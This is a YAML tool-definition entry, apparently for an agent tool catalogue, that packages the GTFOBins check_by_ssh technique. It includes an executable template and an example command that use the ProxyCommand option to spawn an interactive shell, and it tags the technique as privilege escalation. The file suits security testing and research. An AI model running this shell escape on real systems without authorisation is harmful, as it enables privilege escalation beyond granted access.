---
id: monitoring-nagios-check-by-ssh
namespace: monitoring:nagios:check-by-ssh
name: check_by_ssh
description: Nagios plugin for SSH check, can spawn a shell via ProxyCommand exploit.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - ssh
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs: []
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 8
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 8
  network: low
  disk_io: low
allowed-tools:
  - check_by_ssh
  - Bash
  - execFile
parameters: []
features:
  - process-manip
execution:
  template: "check_by_ssh -o 'ProxyCommand /bin/sh -i' -H localhost -C x"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn a shell via check_by_ssh ProxyCommand
    command: check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/check_by_ssh/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "monitoring-plugins"
    commands:
      - "apt-get install -y monitoring-plugins"
  - method: apt
    package_name: "nagios-plugins"
    commands:
      - "apt-get install -y nagios-plugins"
---
